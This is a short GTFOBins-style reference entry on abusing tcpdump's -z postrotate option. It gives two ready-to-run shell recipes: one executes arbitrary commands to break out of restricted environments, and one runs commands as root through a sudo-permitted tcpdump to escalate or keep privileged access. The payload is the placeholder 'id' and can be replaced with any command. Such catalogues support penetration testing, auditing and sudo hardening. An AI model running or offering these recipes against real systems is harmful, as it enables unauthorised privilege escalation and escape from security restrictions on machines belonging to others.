# GTFOBin: tcpdump

These require some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.

In recent distributions (e.g., Debian 10 and Ubuntu 18) AppArmor limits the `postrotate-command` to a small subset of predefined commands thus preventing the execution of the following.

## Command

It can be used to break out from restricted environments by running non-interactive system commands.

```
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```